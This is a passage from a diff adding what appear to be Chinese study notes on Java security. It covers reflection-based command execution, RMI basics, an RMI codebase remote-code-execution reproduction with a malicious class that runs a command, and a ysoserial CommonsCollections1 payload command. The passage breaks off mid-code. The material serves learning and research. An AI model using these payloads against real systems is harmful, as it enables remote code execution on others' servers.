alt="image-20211102162734720"></p>
+<p>原因是<code>Runtime</code>类的构造方法是私有的</p>
+<p>可以这样</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">clazz.getMethod(<span class="string">"exec"</span>, String.class).invoke(clazz.getMethod(<span class="string">"getRuntime"</span>).invoke(clazz), <span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>getMethod</code>的作用是通过反射获取一个类的特定的公有方法。</p>
+<p><code>invoke</code>的作用是执行方法，它的第一个参数是：</p>
+<ul>
+<li>如果这个方法是一个普通方法，那么第一个参数是类对象 </li>
+<li>如果这个方法是一个静态方法，那么第一个参数是类</li>
+</ul>
+<p>上述命令执行的payload可以分解为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">Method exec = clazz.getMethod(<span class="string">"exec"</span>, String.class);</span><br><span class="line">Method getRuntimeMethod = clazz.getMethod(<span class="string">"getRuntime"</span>);</span><br><span class="line">Object runtime = getRuntimeMethod.invoke(clazz);</span><br><span class="line">exec.invoke(runtime, <span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>到这里P神提出了两个疑问</p>
+<ul>
+<li>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ </li>
+<li>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</li>
+</ul>
+<p>第一个问题的解决方式，需要用到一个新的放射方法<code>getConstructor</code></p>
+<blockquote>
+<p>和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。 获取到构造函数后，我们使用 newInstance 来执行。</p>
+</blockquote>
+<p>ProcessBuilder有两个构造函数</p>
+<ul>
+<li>public ProcessBuilder(List command) </li>
+<li>public ProcessBuilder(String… command)</li>
+</ul>
+<p>用第一种形式</p>
+<p>主要传入<code>List.class</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">"calc.exe"</span>))).start();</span><br></pre></td></tr></table></figure>
+
+<p>利用反射的方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            clazz.getMethod(<span class="string">"start"</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">"calc.exe"</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>第二种形式</p>
+<p>主要传入<code>String[].class</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">"calc.exe"</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure>
+
+<p>反射的方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">clazz.getMethod(<span class="string">"start"</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">"calc.exe"</span>&#125;&#125;));</span><br></pre></td></tr></table></figure>
+
+<p>第二个问题：如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p>
+<p>解决方式是<code>getDeclared</code>系列的反射，它与普通的<code>getMethod</code>、<code>getConstructor</code>区别是：</p>
+<ul>
+<li><code>getMethod</code> 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </li>
+<li><code>getDeclaredMethod</code> 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</li>
+</ul>
+<p>实现代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">        Constructor exec = clazz.getDeclaredConstructor();</span><br><span class="line">        exec.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">"exec"</span>, String.class).invoke(exec.newInstance(), <span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用。</p>
+</blockquote>
+<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><blockquote>
+<p>RMI全称是Remote Method Invocation，远程方法调用。</p>
+</blockquote>
+<p>RMI Server</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="comment">// interface继承自interface使用extends</span></span><br><span class="line">    <span class="comment">// interface 代表这个类没有字段 全是方法</span></span><br><span class="line">     <span class="comment">// ⼀个继承了 java.rmi.Remote 的接⼝ 其中定义了我们要调用的类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 这一句是什么意思？</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// extends 继承关键字</span></span><br><span class="line">    <span class="comment">// 使用 implements 关键字可以变相的使java具有多继承的特性</span></span><br><span class="line">    <span class="comment">// throw和throws就是异常相关的关键字</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 定义我们要远程调⽤的函数</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"call from"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Hello world"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ⼀个主类，⽤来创建Registry</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RemoteHelloWorld h = <span class="keyword">new</span> RemoteHelloWorld();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RmiServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个RMI Server分为三部分</p>
+<ol>
+<li>一个继承了<code>java.rmi.Remote</code>的接口，其中定义我们要远程调用的函数，比如这里的<code>hello()</code></li>
+<li>一个实现了此接口的类</li>
+<li>一个主类，用来创建Register，并将上面的类实例化后绑定到一个地址，这就是我们所谓的Server了。</li>
+</ol>
+<p>RMI Client</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Train;</span><br><span class="line"><span class="keyword">import</span> org.vulhub.RMI.RMIServer;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainMain</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"> <span class="comment">// 使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象</span></span><br><span class="line"> RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)</span><br><span class="line">Naming.lookup(<span class="string">"rmi://172.20.10.1:1099/Hello"</span>);</span><br><span class="line"> String ret = hello.hello();</span><br><span class="line"> System.out.println( ret);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 本地使⽤⼀样了。 虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。</p>
+</blockquote>
+<p>一个RMI过程有以下三个参与者：</p>
+<ul>
+<li>RMI Registey</li>
+<li>RMI Server</li>
+<li>RMI Client</li>
+</ul>
+<h4 id="如何攻击RMI-Registry？"><a href="#如何攻击RMI-Registry？" class="headerlink" title="如何攻击RMI Registry？"></a>如何攻击RMI Registry？</h4><blockquote>
+<p>Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。 不过list和lookup方法可以远程调用。 list方法可以列出目标上所有绑定的对象：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// list方法可以列出目标上所有绑定的对象</span></span><br><span class="line">        String[] s = Naming.list(<span class="string">"rmi://172.20.10.131:1099"</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">            System.out.println(s[i]);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lookup作用就是获得某个远程对象</span></span><br><span class="line">        RmiServer.IRemoteHelloWorld hello = (RmiServer.IRemoteHelloWorld)Naming.lookup(<span class="string">"rmi://172.20.10.131:1099/Hello"</span>);</span><br><span class="line">        String ret = hello.hello();</span><br><span class="line">        System.out.println( ret);</span><br></pre></td></tr></table></figure>
+
+<h4 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用codebase执行任意代码</h4><p>有满足如下条件的RMI服务器才能被攻击：</p>
+<ul>
+<li>安装并配置了SecurityManager </li>
+<li>Java版本低于7u21、6u45，或者设置了 <code>java.rmi.server.useCodebaseOnly=false</code> 其中 <code>java.rmi.server.useCodebaseOnly</code> 是在Java 7u21、6u45的时候修改的一个默认设置： <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a> <a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
+</ul>
+<p>复现代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICalc</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ICalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        Integer sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"setup SecurityManager"</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> SecurityManager());</span><br><span class="line">        &#125;</span><br><span class="line">        Calc h = <span class="keyword">new</span> Calc();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">"refObj"</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RemoteRMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>编译及运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -Djava.rmi.server.hostname=172.20.10.131 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</span><br></pre></td></tr></table></figure>
+
+<p>建立一个RMIClient.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ICalc r = (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">"rmi://172.20.10.131:1099/refObj"</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才 会去加载codebase中的类，所以不能将RMIClient.java放在RMI Server所在的目录中。</p>
+</blockquote>
+<p>运行RMIClient：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们只需要编译一个恶意类，将其class文件放置在Web服务器的 /RMIClient$Payload.class 即可。</p>
+</blockquote>
+<p>恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"touch /tmp/Success"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt;</span></span><br><span class="line"><span class="class">    </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ICalc r = (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">"rmi://172.20.10.131:1099/refObj"</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li)); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>想知道原理，可以通过抓包来查看RMI做了什么，跟着P神文章做了一遍，通过wireshark抓包，抓到一些进行了序列化的数据，用<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">GitHub - NickstaDB/SerializationDumper: A tool to dump Java serialization streams in a more human readable form.</a> 工具查看序列化数据，但是看不懂。</p>
+</blockquote>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>Java、php、Python反序列化有什么异同?</p>
+<blockquote>
+<p>Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式 生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。 但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者 在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。 当然，PHP中也提供了一个魔术方法叫 __wakeup ，在反序列化的时候进行触发。很多人会认为Java的 readObject 和PHP的 __wakeup 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决 的问题稍微有些差异。 Java设计 readObject 的思路和PHP的 __wakeup 不同点在于： readObject 倾向于解决“反序列化时如 何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的 问题。</p>
+</blockquote>
+<h4 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h4><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><h4 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h4><h4 id="ysoserial工具"><a href="#ysoserial工具" class="headerlink" title="ysoserial工具"></a>ysoserial工具</h4><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p>生成<code>CommonsCollections</code>利用poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h4><p><code>URLDNS</code> 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时 使⽤： </p>
+<ul>
+<li>使⽤Java内置的类构造，对第三⽅库没有依赖 </li>
+<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
+</ul>
+<h4 id="common-collections"><a href="#common-collections" class="headerlink" title="common-collections"></a>common-collections</h4><p>poc1</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span 